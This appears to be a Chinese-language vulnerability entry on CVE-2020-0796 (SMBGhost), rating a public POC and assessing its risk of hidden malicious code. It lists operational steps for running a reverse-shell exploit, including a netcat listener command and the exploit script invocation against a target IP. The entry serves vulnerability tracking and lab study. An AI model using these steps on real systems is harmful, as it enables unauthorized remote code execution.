## CVE-2020-0796 - Microsoft Windows SMBv3 远程代码执行 (RCE) / 本地提权 (LPE) / 整型溢出

**漏洞编号:** CVE-2020-0796

**漏洞类型:** 远程代码执行 (RCE) / 本地提权 (LPE) / 整型溢出

**影响应用:** Microsoft Windows SMBv3

**危害等级:** 高危 (Critical)

**CVSS评分:** 10.0

**影响版本:** Windows 10 version 1903, release 19H1 Build 18362.356 (x64) 及其他受影响的SMBv3 Windows 10 和 Windows Server 系统。

**利用条件:** 预认证 (Pre-authentication)；远程网络访问 (SMB端口445)；需满足特定操作系统版本和内存偏移量。

**POC 可用性:** 9/10

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 中

**投毒风险:** 15%

## 详情

CVE-2020-0796，也被称为“SMBGhost”，是Microsoft Windows SMBv3协议中的一个关键的预认证远程代码执行 (RCE) 漏洞，其根本原因是处理恶意压缩数据包时发生的整型溢出。该漏洞允许未经身份验证的远程攻击者在受影响的SMB服务器或客户端系统上执行任意代码，甚至可能导致本地提权 (LPE)。

**POC有效性分析:**
该POC项目提供了一个高度详细且功能完整的CVE-2020-0796漏洞利用演示。它明确指出是为一个学校网络安全项目而开发，并明确注明所有利用代码均来自ZecOps，作者仅为教育目的进行改编和使用。这种透明度极大地增加了其可信度。POC针对一个非常具体的Windows 10版本（版本1903，构建18362.356，x64位），这表明它是一个精确调整的利用。演示环境要求使用VirtualBox的NATNetwork，并在目标机器上禁用Windows防火墙以允许对端口445的访问，这些都是典型的实验环境配置，并非实际攻击中的普遍条件。利用过程分为几个清晰的步骤，包括使用`calc_target_offsets.bat`脚本计算目标系统的内存偏移量，然后将这些偏移量更新到`SMBleedingGhost.py`利用脚本中。最终目标是通过Netcat建立一个反向shell，这直接证明了RCE的成功。整个过程有详细的文字说明和屏幕截图辅助，表明其可用性和成功率在指定环境下非常高。

**利用步骤:**
1.  **环境准备:** 攻击机和目标机均在VirtualBox中配置为NATNetwork。攻击机需安装Python 3.x和Netcat，并准备`SMBleedingGhost.py`。目标机需为Windows 10版本1903 Build 18362.356，并确保Windows防火墙已禁用。
2.  **获取IP地址:** 在攻击机和目标机上运行`ipconfig`获取各自的IP地址。
3.  **计算目标偏移量:** 在目标机上运行`calc_target_offsets.bat`脚本，获取漏洞利用所需的内存偏移量。
4.  **更新利用脚本:** 在攻击机上，使用文本编辑器打开`SMBleedingGhost.py`，找到`OFFSETS = {`部分，并用从目标机获取的偏移量替换现有值，然后保存文件。
5.  **启动Netcat监听:** 在攻击机上开启一个Netcat监听器，例如：`ncat -lvp 4321`。
6.  **执行漏洞利用:** 在攻击机上执行Python利用脚本：`python SMBleedingGhost.py <目标机IP地址> <攻击机IP地址>`。
7.  **验证RCE:** 观察攻击机上的Netcat监听器，应能接收到来自目标机的反向shell连接，从而确认远程代码执行成功。

**投毒风险分析:**
根据提供的POC文档和其描述，此POC的投毒风险评估为低（15%）。主要原因如下：
1.  **明确的教育目的:** README文件明确指出该项目是为教育目的而设计，用于在受控实验室环境中演示漏洞利用，而非用于恶意攻击。
2.  **代码来源透明:** POC明确将核心利用代码归功于ZecOps，这是一个已知的安全研究团队，其代码通常经过审查。虽然实际的Python代码未在输入中提供，但其描述的使用方式是标准的漏洞利用流程（计算偏移、触发RCE、反向shell）。
3.  **无混淆或可疑行为指示:** 描述中没有提及代码混淆、加密、连接未知外部C2服务器、下载额外恶意负载或任何超出建立反向shell之外的恶意行为。Netcat建立反向shell是合法渗透测试和漏洞验证的常见手段，不应被误判为投毒行为。
4.  **环境特定性:** POC需要一个非常具体的Windows 10构建版本和禁用防火墙等特定环境配置才能成功，这限制了其广泛、非目标性恶意使用的可能性。
5.  **易于审计:** 考虑到其教育性质和透明度，如果能够获取完整的源代码，对代码进行审计以检查是否存在任何隐藏的恶意负载或功能将相对容易。
虽然任何可执行的漏洞利用代码都应谨慎处理，但就当前提供的信息而言，该POC本身不包含明显的恶意投毒代码或意图。用户仍应从官方或可信来源下载代码，并在沙箱环境中进行验证。

**项目地址:** https://github.com/ZecOps/CVE-2020-0796-RCE-POC

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2020-0796
